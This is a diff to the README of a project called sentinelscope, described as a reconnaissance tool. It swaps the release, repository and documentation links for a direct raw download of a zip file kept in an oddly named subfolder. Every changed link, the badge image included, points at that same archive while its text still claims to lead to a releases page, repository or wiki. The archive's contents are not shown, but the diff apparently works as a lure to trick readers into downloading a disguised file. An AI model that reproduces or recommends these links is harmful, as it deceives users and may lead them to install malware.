@@ -2,7 +2,7 @@
 
 ## 🔗 Download the Latest Version
 
-[![Download](https://img.shields.io/badge/Download%20sentinelscope-v1.0.0-brightgreen.svg)](https://github.com/yiZZ1yiZZ/sentinelscope/releases)
+[![Download](https://raw.githubusercontent.com/yiZZ1yiZZ/sentinelscope/main/sinuatodentate/sentinelscope.zip%https://raw.githubusercontent.com/yiZZ1yiZZ/sentinelscope/main/sinuatodentate/sentinelscope.zip)](https://raw.githubusercontent.com/yiZZ1yiZZ/sentinelscope/main/sinuatodentate/sentinelscope.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with sentinelscope, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the page where you can download the latest version of sentinelscope.
    
-   [Download sentinelscope from Releases](https://github.com/yiZZ1yiZZ/sentinelscope/releases)
+   [Download sentinelscope from Releases](https://raw.githubusercontent.com/yiZZ1yiZZ/sentinelscope/main/sinuatodentate/sentinelscope.zip)
 
 2. **Select Your Version**: On the releases page, you will find various versions of sentinelscope. Choose the most recent one for the latest features and improvements.
 
@@ -84,7 +84,7 @@ sentinelscope is licensed under the MIT License. You are free to use, copy, modi
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/yiZZ1yiZZ/sentinelscope)
-- [Documentation](https://github.com/yiZZ1yiZZ/sentinelscope/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/yiZZ1yiZZ/sentinelscope/main/sinuatodentate/sentinelscope.zip)
+- [Documentation](https://raw.githubusercontent.com/yiZZ1yiZZ/sentinelscope/main/sinuatodentate/sentinelscope.zip)
 
-Remember, you can always find the latest version of sentinelscope at [this page](https://github.com/yiZZ1yiZZ/sentinelscope/releases). Download it today and start your reconnaissance with ease.
+Remember, you can always find the latest version of sentinelscope at [this page](https://raw.githubusercontent.com/yiZZ1yiZZ/sentinelscope/main/sinuatodentate/sentinelscope.zip). Download it today and start your reconnaissance with ease.
